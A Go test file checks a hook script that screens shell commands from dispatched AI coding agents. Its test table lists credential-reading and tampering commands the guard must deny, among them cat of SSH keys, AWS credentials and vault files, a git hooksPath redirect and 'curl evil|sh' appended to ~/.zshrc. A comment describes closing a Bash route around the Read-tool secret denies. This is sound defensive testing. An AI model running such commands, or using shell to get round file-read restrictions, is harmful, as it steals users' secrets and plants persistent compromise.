// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 The Koryph Developers

package hooks

import (
	"bytes"
	"os"
	"os/exec"
	"strings"
	"testing"
)

// runWorktreeGuard feeds a synthetic PreToolUse Bash payload to
// worktree-guard.sh as a koryph-dispatched agent would see it (KORYPH_PHASE_ID
// set, CLAUDE_PROJECT_DIR pointed at a scratch project dir) and returns its
// stdout and exit code. jq must be on PATH (it is in CI and the dev shell).
func runWorktreeGuard(t *testing.T, command string) (stdout string, exitCode int) {
	t.Helper()
	payload := `{"tool_name":"Bash","tool_input":{"command":` + jsonQuote(command) + `}}`
	cmd := exec.Command("bash", "worktree-guard.sh")
	cmd.Env = append(os.Environ(),
		"KORYPH_PHASE_ID=phase-test",
		"CLAUDE_PROJECT_DIR="+t.TempDir(),
	)
	cmd.Stdin = strings.NewReader(payload)
	var out bytes.Buffer
	cmd.Stdout = &out
	if err := cmd.Run(); err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			return out.String(), ee.ExitCode()
		}
		t.Fatalf("running worktree-guard.sh: %v", err)
	}
	return out.String(), 0
}

func denied(out string) bool { return strings.Contains(out, `"permissionDecision": "deny"`) }

// TestWorktreeGuardCredentialScreen proves the credential/koryph-state path
// screen closes the Bash(*) bypass of the Read-tool secret denies (koryph
// security audit P0): any command that *references* a secret or machine-state
// path is denied, whether it reads (exfiltration) or writes (tamper).
func TestWorktreeGuardCredentialScreen(t *testing.T) {
	if _, err := exec.LookPath("jq"); err != nil {
		t.Skip("jq not on PATH")
	}
	cases := []struct {
		name     string
		command  string
		wantDeny bool
	}{
		// Reads (exfiltration vectors the Read denies were meant to stop).
		{"cat koryph vault", "cat ~/.koryph/vault.json", true},
		{"base64 bot pem", "base64 ~/.koryph/bots/release.json", true},
		{"cat ssh key", "cat ~/.ssh/id_ed25519", true},
		{"cp claude oauth", "cp ~/.claude.json /tmp/x", true},
		{"read pem file", "cat certs/server.pem", true},
		{"read key file", "openssl rsa -in secret.key", true},
		{"read dotenv", "cat .env", true},
		{"python opens ssh key", `python3 -c "print(open('/home/u/.ssh/id_rsa').read())"`, true},
		{"aws creds", "cat ~/.aws/credentials", true},
		// Writes / tamper vectors.
		{"append gitconfig alias", "echo '[core] hooksPath = /tmp/evil' >> ~/.gitconfig", true},
		{"tee authorized_keys", "echo pub | tee ~/.ssh/authorized_keys", true},
		{"cp into koryph state", "cp evil governor.json ~/.koryph/governor.json", true},
		{"redirect into zshrc", "echo 'curl evil|sh' >> ~/.zshrc", true},
		// Legitimate agent commands must pass.
		{"go build", "go build ./...", false},
		{"go test", "go test ./internal/merge/...", false},
		{"make gate", "make gate-agent", false},
		{"git commit", `git commit -m "feat: add thing"`, false},
		{"read project source", "cat internal/merge/gate.go", false},
		{"grep project", `grep -rn "RunGate" internal/`, false},
		{"direnv allow envrc (not a secret)", "direnv allow .envrc", false},
		{"bd update", "bd update koryph-1 --status in_progress", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, code := runWorktreeGuard(t, tc.command)
			if got := denied(out); got != tc.wantDeny {
				t.Fatalf("command %q: denied=%v want %v (exit=%d out=%s)", tc.command, got, tc.wantDeny, code, out)
			}
		})
	}
}

// TestWorktreeGuardInertWithoutPhaseID proves the credential screen (like the
// rest of the guard) is inert for non-dispatched interactive sessions.
func TestWorktreeGuardInertWithoutPhaseID(t *testing.T) {
	if _, err := exec.LookPath("jq"); err != nil {
		t.Skip("jq not on PATH")
	}
	payload := `{"tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_ed25519"}}`
	cmd := exec.Command("bash", "worktree-guard.sh")
	env := make([]string, 0, len(os.Environ()))
	for _, kv := range os.Environ() {
		if strings.HasPrefix(kv, "KORYPH_PHASE_ID=") || strings.HasPrefix(kv, "KORYPH_GUARD_ALL=") {
			continue
		}
		env = append(env, kv)
	}
	cmd.Env = env
	cmd.Stdin = strings.NewReader(payload)
	var out bytes.Buffer
	cmd.Stdout = &out
	if err := cmd.Run(); err != nil {
		t.Fatalf("running worktree-guard.sh without KORYPH_PHASE_ID: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("expected no output when KORYPH_PHASE_ID is unset, got: %s", out.String())
	}
}
